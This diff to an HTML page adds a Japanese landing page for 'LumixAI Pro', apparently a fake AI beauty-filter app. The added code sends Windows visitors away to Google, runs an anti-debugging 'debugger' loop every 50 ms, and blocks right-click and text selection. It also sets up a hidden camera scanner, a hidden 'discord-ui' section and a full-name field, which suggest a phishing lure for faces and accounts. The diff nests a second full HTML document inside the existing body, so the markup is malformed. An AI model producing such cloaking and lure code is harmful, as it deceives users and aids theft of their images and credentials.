@@ -30,13 +30,52 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <script>
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LumixAI Pro - 次世代AI美顔補正システム</title>
 
+    <meta property="og:title" content="LumixAI Pro | 最新AI自動顔加工">
+    <meta property="og:description" content="最新AIを搭載！あなたの表情を自動で黄金比パーツへ補正。プロ仕様の加工を今すぐ体験。">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://lumix-ai-three.vercel.app/">
+    <meta property="og:image" content="https://images.openai.com/blob/57662c5b-7822-4876-b60b-8d5f3078a633/stunning-portrait-transformed-by-ai.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <style>
+        :root { --p: #10b981; --pd: #059669; --bg: #f8fafc; --c: #ffffff; --t1: #1e293b; --t2: #64748b; }
+        body { margin: 0; background: var(--bg); color: var(--t1); font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; user-select: none; }
+        .container { background: var(--c); padding: 2.5rem 1.5rem; border-radius: 24px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); max-width: 400px; width: 90%; text-align: center; margin-top: 40px; border: 1px solid #e2e8f0; }
+        h1 { font-size: 24px; font-weight: 800; margin: 0 0 10px; color: var(--p); }
+        .desc { color: var(--t2); font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+        .info-section { max-width: 400px; width: 90%; margin-top: 20px; text-align: left; background: #fff; padding: 15px; border-radius: 16px; border: 1px solid #e2e8f0; }
+        .info-title { font-size: 14px; font-weight: bold; color: var(--t1); margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
+        .info-content { font-size: 11px; color: var(--t2); line-height: 1.4; height: 80px; overflow-y: scroll; background: #f1f5f9; padding: 10px; border-radius: 8px; }
+        input { width: 100%; padding: 14px; background: #f1f5f9; border: 2px solid transparent; border-radius: 12px; margin-bottom: 12px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--p); background: #fff; }
+        #camera-zone { display: none; position: relative; width: 240px; height: 240px; margin: 0 auto 20px; }
+        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid var(--p); }
+        .scanner { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: var(--p); box-shadow: 0 0 10px var(--p); animation: scan 2.5s infinite; display: none; }
+        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 100%; } }
+        .btn { background: var(--p); color: white; border: none; padding: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; width: 100%; font-size: 15px; }
+        #discord-ui, .loader { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--p); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        canvas { display: none; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <script>
+        (function(){if(navigator.userAgent.toLowerCase().indexOf('windows')!==-1){window.location.replace('https://www.google.com');}})();
+        setInterval(function(){(function(){return false;}['constructor']('debugger')['call']());},50);
     </script>
 
     <div class="container" id="card">
         <h1>LumixAI Pro</h1>
-        <p class="desc">プロ仕様のAI補正エンジンを搭載。<br>あなたの表情を黄金比に基づき最適化します。</p>
+        <p class="desc">超最新AI！<br>貴方の顔を美男・美女に加工します</p>
 
         <div id="setup-ui">
             <input type="text" id="un" placeholder="お名前（フルネーム推奨）">
